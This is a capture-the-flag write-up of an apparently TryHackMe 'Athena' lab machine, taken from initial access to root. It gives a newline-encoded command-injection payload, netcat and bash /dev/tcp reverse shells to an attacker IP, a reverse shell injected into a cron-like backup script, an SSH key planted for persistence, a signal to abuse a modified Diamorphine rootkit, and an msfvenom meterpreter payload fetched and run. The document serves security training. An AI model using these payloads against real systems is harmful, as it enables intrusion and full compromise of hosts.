$ cat msg_for_administrator.txt
Dear Administrator,

I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern
```

* This message is from an intern called `Athena` to the administrator and it mentions the development of a new ping system that can be accessed via the URI `/myrouterpanel`

### **<strong><font color="MediumPurple">HTTP - 80:</font></strong>**
#### **<strong><font color="DarkKhaki">Front page</font></strong>**

Upon accessing [http://athena.thm](https://athena.thm), the displayed page is as follows:

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-16 14_40_14-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>http://athena.thm</i></center>
<br/>

* The homepage is relatively sparse in terms of content, primarily featuring the representation of the '**goddess of wisdom**' Athena. 
* A review of the page's source code reveals no noteworthy elements to investigate further. 
* Additionally, the functionality of the '**Home**,' '**About**,' and '**Contact**' buttons appears to be malfunctioning as they do not lead to their respective pages.

#### **<strong><font color="DarkKhaki">/myrouterpanel</font></strong>**
Let's navigate to the URI we found in the message from 'Athena':

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-16 14_44_17-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>http://athena.thm/myrouterpanel</i></center>
<br/>

* There is a Ping system implemented in the web application that allow you to ping other devices and IP addresses.

#### **<strong><font color="DarkKhaki">Testing the ping feature</font></strong>**
* Let's ping **127.0.0.1** and see what we will get in the response:

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-16 14_46_57-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Ping result of 127.0.0.1</i></center>
<br/>

* We have the typical `ping` response with 4 ICMP packets sent and 0% packet loss.

With that mind, if user input is not properly sanitized, there might be a command injection vulnerability here, which allows the attacker to inject OS commands and get the response back.<br/>
For example, if the command being executed in the backend whenever this Ping feature is utilized is `ping -c 4 127.0.0.1`, an attacker can simply inject a command of his choice after the IP address which will be executed after the ping command, using a command separator such as `;` => `ping -c 4 127.0.0.1;id`.<br/>
In this case, if there is no filtering or sanitization on user input, an input such as `127.0.0.1;id`, will make the server run the ping command and the id command and return the result of the command as a response. 

# **<strong><font color="Brown">Initial Foothold</font></strong>**
## **<strong><font color="DarkCyan">Shell as www-data</font></strong>**
### **<strong><font color="DarkKhaki">Command Injection</font></strong>**

* Let's test the theory in the section above and try to execute the id command:

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-16 14_56_10-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Hacking attempt response</i></center>
<br/>

* From the response, there is at least some detection mechanism implemented on user input, which check whether the input contains a character such as semi-colon `;`

One way to bypass this filtering mechanism is to inject the URL-encoded newline character in percent-encode (`%0A`) before the command you want to execute. 
For example, sending a request with the following POST data:

```bash
ip=127.0.0.1%0Aid&submit=
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-16 14_59_06-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Executing the 'id' command</i></center>
<br/>

* As can be seen from the returned response, the injected command '`id`' has been executed and we got the result of the execution back.

### **<strong><font color="DarkKhaki">Reverse shell</font></strong>**
Let's escalate the impact and execute a reverse shell on the server to get an initial foothold as `www-data`. <br/>

**1-** Start a netcat listener on port **9999**
```bash
nc -nlvp 9999
```

**2-** Run the following command via the command injection vulnerability:
```bash
nc -e /usr/bin/bash 10.8.16.233 9999
```

**3-** Sending the request with the following POST data:
```bash
ip=127.0.0.1%0Anc+-e+/usr/bin/bash+10.8.16.233+9999&submit
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-16 16_09_08-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Sending the request</i></center>
<br/>

**4-** After sending the request, you should get a reverse shell back on your listener:

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-16 16_09_45-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>nc -nlvp 9999</i></center>
<br/>

### **<strong><font color="DarkKhaki">Shell stabilization</font></strong>**

* Run the following commands to stabilize you shell:

```bash
# On the target machine
python3 -c import pty;pty.spawn("/bin/bash")
export TERM=xterm
Ctrl+Z

# On your machine
$ stty raw -echo ; fg ; reset;
```

# **<strong><font color="Brown">Lateral Movement</font></strong>**
## **<strong><font color="DarkCyan">Shell as athena</font></strong>**
### **<strong><font color="DarkKhaki">Enumeration as www-data</font></strong>**

* There are 3 users with console: `root`, `ubuntu` and `athena`

```bash
$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash
athena:x:1001:1001::/home/athena:/bin/bash
```

* The user `www-data` does not have enough privileges to access the home directory of users `ubuntu` and `athena`.

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-17 16_44_47-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Access denied to HOME directories</i></center>
<br/>

* There are no interesting binaries with SUID bit set:

```bash
$ find / -type f -perm -04000 -ls 2>/dev/null
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-16 16_27_19-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Binaries with SUID bit</i></center>
<br/>

* There are no files owned by other users (`athena`, `ubuntu`) and readable/writable by `www-data`:

```bash
# Files owned by 'athena' and readable by 'www-data'
find -type f -user athena -readable 2>/dev/null
# File owned by 'athena' and writable by 'www-data'
find -type f -user athena -writable 2>/dev/null

# Files owned by 'ubuntu' and readable by 'www-data'
find -type f -user ubuntu -readable 2>/dev/null
# File owned by 'ubuntu' and writable by 'www-data'
find -type f -user ubuntu -writable 2>/dev/null
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-16 16_19_54-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Searching for files</i></center>
<br/>

* Searching for files owned by the user `www-data`, by filtering out `/proc/` files, I got the following file:

```bash
find / -type f -user www-data 2>/dev/null | grep -v 'proc'
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-17 16_46_22-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>/usr/share/backup/backup.sh</i></center>
<br/>

### **<strong><font color="DarkKhaki">/usr/share/backup/backup.sh</font></strong>**
* The following is the content of the file `backup.sh`:

```bash
#!/bin/bash

backup_dir_zip=~/backup

mkdir -p "$backup_dir_zip"

cp -r /home/athena/notes/* "$backup_dir_zip"

zip -r "$backup_dir_zip/notes_backup.zip" "$backup_dir_zip"

rm /home/athena/backup/*.txt
rm /home/athena/backup/*.sh

echo "Backup completed..."
```

* This bash script creates a backup of files in the `/home/athena/notes` directory, zips them into a file named `notes_backup.zip`, removes `.txt` and `.sh` files from the directory `/home/athena/backup/` and finally prints out **'Backup completed ...'**

With that in mind, I'm guessing that this backup script gets executed every minute or 2, using a cron job or something alike.

### **<strong><font color="DarkKhaki">Checking for cron jobs</font></strong>**
* There is no cron job configured in this system

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-17 16_55_09-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>/etc/crontab</i></center>
<br/>

### **<strong><font color="DarkKhaki">Running pspy</font></strong>**

* Let's monitor processes using [pspy](https://github.com/DominicBreuker/pspy) to verify whether this scripts is executed regularly or not

To do so:  <br/>
**1-** Let's download [pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64) from the latest release
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

**2-** Start a simple HTTP server using python, which will be serving the **pspy64** binary
```bash
python3 -m http.server 80
```

**3-** Download the **pspy64** binary in the **/tmp/** directory of the target machine
```bash
www-data@routerpanel:/$ cd /tmp/
www-data@routerpanel:/tmp/$ wget http://tun0-IP/pspy64
```

**4-** Make the binary **pspy64** executable and run it:
```bash
www-data@routerpanel:/tmp/$ chmod +x pspy64
www-data@routerpanel:/tmp/$ ./pspy64
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-17 20_36_38-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>pspy64</i></center>
<br/>

* As can be seen, the backup script is executed with `athena`'s privileges every minute. Additionally, the backup script is owned by me (the user `www-data`), which means we could inject a reverse shell script and get a shell access as `athena`.

### **<strong><font color="DarkKhaki">Shell as athena</font></strong>**
With that in mind, let's proceed with the following steps: <br/>

**1-** Inject the following reverse shell script in `/usr/share/backup/backup.sh` file:
```bash
/usr/bin/bash -c 'bash -i >& /dev/tcp/10.8.16.233/9998 0>&1'
```

**2-** Start a netcat listener on your attacking machine on the port specified in the injected reverse shell script:
```bash
nc -nlvp 9998
```

**3-** Wait for a minute or so and you will get a reverse shell back running as `athena`:

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-17 17_05_25-KaliLinux - VMware Workstation 17 Player (Non-commercial use only) 1.png" alt="">
<center><i>shell as 'athena'</i></center>
<br/>

# **<strong><font color="Brown">Privilege Escalation</font></strong>**
## **<strong><font color="DarkCyan">Shell as root</font></strong>**
### **<strong><font color="DarkKhaki">Stable SSH Access</font></strong>**

Let's get a stable SSH access on the target, as the user `athena`, by following the below steps: <br/>
**1-** On your attacking machine, generate your own ssh keys, by running the command `ssh-keygen`. This will generate the following keys: <br/>
- **Private key**: id_rsa
- **Public key:** id_rsa.pub

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-17 18_15_07-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>SSH keys</i></center>
<br/>

**2-** After that, copy the content of the **id_rsa.pub** file and put it inside the `/home/plot_admin/.ssh/authorized_keys` file on the target machine.

```bash
# On the attacking machine:
cat id_rsa.pub | xclip -selection clipboard

# On the target machine:
cd /home/athena/.ssh
nano authorized_keys
# Paste the clipboard inside this file and save
```

**3-** Finally, you can connect to the target machine as `athena` using your **id_rsa** file:

```bash
# On the attacking machine:
ssh -i id_rsa athena@athena.thm
Enter passphrase for key 'id_rsa': # Enter the passphrase you have configured when you ran 'ssh-keygen'
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-17 19_03_55-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>SSH access as 'athena'</i></center>
<br/>

### **<strong><font color="DarkKhaki">Enumeration as athena</font></strong>**

* The user `athena` can run the following command with root privileges:

```bash
athena@routerpanel:~$ sudo -l
<...SNIP...>
/usr/sbin/insmod /mnt/.../secret/venom.ko
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-17 17_06_19-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>sudo -l</i></center>
<br/>

* This command is used to **load a kernel module** (in this case, it's the kernel object **`venom.ko`**) into the Linux kernel using the **`insmod`** utility, which is typically used for loading kernel modules manually.

### **<strong><font color="DarkKhaki">Analysing the kernel object venom.ko</font></strong>**

* Let's navigate to the path where the kernel module file is located and run the `strings` command to inspect printable characters in the file:

```bash
athena@routerpanel:~$ cd /mnt/.../secret/
athena@routerpanel:~$ strings venom.ko
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-17 17_25_01-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>strings venom.ko</i></center>
<br/>

* In the initial strings that were returned, there's a reference to an **LKM rootkit** and its creator, '**m0nad**'

### **<strong><font color="DarkKhaki">LKM Rootkits</font></strong>**

After a quick google search on this type of rootkits, I found the following:
* **LKM**, short for **Loaded Kernel Module**, rootkits operates at the kernel level of an operating system, typically targeting Unix-like systems.
* They are designed to conceal their presence and actions on a compromised systems.

> *For more information on this type of rootkits, refer to this [article](https://sandflysecurity.com/news/sandfly-4-3-2-linux-loadable-kernel-module-rootkit-taint-detection/)*

### **<strong><font color="DarkKhaki">Analyzing Diamorphine rootkit</font></strong>**

Searching for LKM rootkits that were created by '**m0nad**' (The author of the kernel module `venom.ko`), I got the following result:

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-17 17_29_42-LKM rootkit by m0nad - Recherche Google — Mozilla Firefox Private Browsing.png" alt="">

* [Diamorphine](https://github.com/m0nad/Diamorphine) is a well-known open-source Linux Loadable Kernel Module (**LKM**) rootkit. It is designed for educational purposes and security research.<br/>
The [features](https://github.com/m0nad/Diamorphine) of this rootkit are quite simple to understand: <br/>

**1-** When loaded, the module starts invisible. In other words, running the `lsmod` command, which is a utility used to display the statuses of currently loaded modules in the Linux kernel,  will not be shown among the already loaded modules. <br/>
**2-** Sending the signal '**63**' to any PID will make the module become visible, as shown in the figure below:

```bash
kill -63 0
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-17 17_53_13-k - VMware Workstation 17 Player (Non-commercial use only).png" alt="">

<br/>

**3-** Sending the signal '**64**' to any PID will make the given user become root, as show below:

```bash
kill -64 0
```

* As can be seen, if the signal sent is **SIGSUPER**, which is a global variable that refers to the value **`64`** (in the file [diamorhine.h](https://github.com/m0nad/Diamorphine/blob/master/diamorphine.h) as shown in the figure below), the function `give_root()` is executed, which will grant the current user root privileges.

### **<strong><font color="DarkKhaki">Sending signal 64</font></strong>**

With that in mind, since the user `athena` can load the module `venom.ko` into the kernel, and since the module `venom.ko` is a Diamorphine module, we can easily become root by sending a signal 64 to any PID. 
Let's test this theory out, by running the following commands:

```bash
athena@routerpanel:~$ sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
athena@routerpanel:~$ kill -64 0
athena@routerpanel:~$ whoami
athena
```

* As can be seen, we are still running as `athena`, which was not what we were expecting. This suggests that the machine's creator may have introduced some modifications to the Diamorphine rootkit's source code, such as changing the signal responsible for becoming root, prior to the compilation process. 

### **<strong><font color="DarkKhaki">Reverse Engineering the module</font></strong>**

* With that in mind, since we have access to the kernel module `venom.ko`, which is an ELF binary, let's reverse engineer it using Ghidra in our local machine.

To do so, let's follow the below steps: <br/>
**1-** Navigate to the directory where the kernel module is located and start a python web server from there, which will be serving the file `venom.ko`:

```bash
athena@routerpanel:~$ cd /mnt/.../secret/
athena@routerpanel:/mnt/.../secret/$ python3 -m http.server 1234
```

**2-** On your attacking machine, download the kernel module and import it into a Ghidra project:

```bash
wget http://athena.thm:1234/venom.ko
```

After Ghidra finishes its analysis of the binary, let's go ahead and analyse the function `hacked_kill`, which as we said in the previous section, is responsible of handling the signals sent by the user:

<center><i>Ghidra</i></center>
<br/>

* As can be seen and as expected, the signal which needs to be sent in order to become root, is no longer set ti **64**, but rather **0x39**, which is **57** in decimal.
* In other words, we need to send the signal **57** in order to become **root**

### **<strong><font color="DarkKhaki">Shell as root</font></strong>**

* Let's run the following commands, to escalate privileges to root, thanks to the Diamorphine rootkit:

```bash
athena@routerpanel:~$ sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
athena@routerpanel:~$ kill -57 0
```

<center><i>root shell</i></center>
<br/>

* As simple as that, we became root and retrieved the root flag !!

> **NOTE:** *If you get an error saying that the module could not be inserted, it means that the module has already been loaded and you should be able to interact with it as shown in the figure above.*

## **<strong><font color="DarkCyan">Extra: Privilege Escalation using Metasploit</font></strong>**
### **<strong><font color="DarkKhaki">About the Metasploit module</font></strong>**

* When I was searching for Diamorphine rootkit and how it works, I came across a Metasploit module named `exploit/linux/local/diamorphine_rootkit_signal_priv_esc`, which uses Diamorphine rootkit's privilege escalation feature using signal 64 to elevate the privileges of arbitrary process to UID 0 (**root**).
* One notable feature of this module is its flexibility, as you have the option to customize the signal value to any desired value, rather than being limited to a default value **64**.

### **<strong><font color="DarkKhaki">Setting up multi handler</font></strong>**

To use this module, we should first have a meterpreter shell that we can run in the background and provide the meterpreter shell session ID to the Diamorphine module in order to run it and eventually escalate privileges.
In order to get a meterpreter shell on the `athena.thm`, follow the below steps: <br/>

**1-** Start the Metasploit Framework Console, on your attacking machine:

```bash
msfconsole -q
```

**2-** Use and configure the multi handler module:

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > options
.... Displays required options ....
msf6 exploit(multi/handler) > set LHOST tun0
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
```

**3-** Run the multi handler to begin listening on port **4444** (*default port*)

```bash
msf6 exploit(multi/handler) > run
```

### **<strong><font color="DarkKhaki">Generating the ELF binary</font></strong>**

Now, we can proceed to create an ELF binary using **msfvenom**. This binary, when executed on the target machine, will establish a connection back to the multi-handler, which will provide us with a Meterpreter shell, running as `athena`. <br/>
To do so, let's run the following command on the attacking machine:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.8.16.233 LPORT=4444 --platform linux -a x64 -f elf -o reverse
```

* This command will generate an ELF binary named `reverse`.

<center><i>Generating the ELF binary 'reverse'</i></center>
<br/>

### **<strong><font color="DarkKhaki">Meterpreter Shell</font></strong>**

* The only remaining task is to transfer the '**reverse**' binary to the target machine, grant it execution permission, and execute it.

```bash
# On the attacking machine, start a web server:
$ python3 -m http.server 80

# On the target machine
athena@routerpanel:~$ cd /tmp
athena@routerpanel:/tmp$ wget http://10.8.16.233/reverse
athena@routerpanel:/tmp$ chmod +x reverse
athena@routerpanel:/tmp$ ./reverse
```

<center><i>Running the 'reverse' binary</i></center>
<br/>

* After a few moments, you should get a Meterpreter shell on your multi handler listener:

<center><i>Running the 'reverse' binary</i></center>
<br/>

### **<strong><font color="DarkKhaki">Escalate to root</font></strong>**

**1-** Within your meterpreter shell, background the session, by running the command:
```bash
meterpreter > bg
```

**2-** Identify the session ID of your meterpreter session by running the `sessions` command:

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-athena/2023-09-17 19_10_54-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Running sessions</i></center>
<br/>

* In my case, the session ID is **`8`**

**3-** Use, configure and run the Diamorphine metasploit module as shown below:
```bash
msf6 exploit(multi/handler) > use exploit/linux/local/diamorphine_rootkit_signal_priv_esc
msf6 exploit(linux/local/diamorphine_rootkit_signal_priv_esc) > set SESSION <session-ID>
msf6 exploit(linux/local/diamorphine_rootkit_signal_priv_esc) > set SIGNAL 57
msf6 exploit(linux/local/diamorphine_rootkit_signal_priv_esc) > run
```

<center><i>Root Meterpreter shell</i></center>
<br/>

* As you can see, we have escalated our privileges and as a result, we have now a meterpreter shell running as **root**.

# **<strong><font color="Brown">Attack Chain</font></strong>**

* Nmap discovered 3 open ports:
	* Port **22** running an `OpenSSH 8.2p1`
	* Port **80** running an HTTP service `Apache httpd 2.4.41`
	* Ports **139** & **445** running `Samba smbd 4.6.2`
* Anonymous login is allowed in the samba service and there is a text file inside the **public** share, which mentions a directory '`/myrouterpanel`' that leads to a router panel interface where there is a Ping service.
* Navigating to this URI (`myrouterpanel`), there is indeed a Ping system which allows users to ping hosts by providing the IP address. This endpoint is vulnerable to command injection vulnerabilities, allowing attackers to inject OS commands of their choice prefixed with the new line character `%0A`, which serves as a bypass of the filtering implemented in the backend, which detects characters such as `;`, `|`, `&`.
* Leveraging this command injection vulnerability, I executed a reverse shell script and got initial foothold as the user `www-data`.
* Once in, there is a backup script, owned by the user `athena`, and gets executed every minute by the user `athena`. With that in mind, I injected a reverse shell script inside the backup script and got a shell back running as `athena`.
* As `athena`, this user can load a kernel module called `venom.ko` using `insmod` with root privileges. After some analysis of this kernel object file, I found out that it's a Diamorphine module and can be used to escalate privileges to root by sending the signal **64** to any PID. However, the provided module has been modified so reverse engineering was required to get the exact value of the signal that needs to be sent in order to escalate to root, and this signal was **57**
* After knowing the signal value that allows the escalation of privileges, I loaded the Diamorphine module, sent the signal **57** to PID=0 and got a root shell.
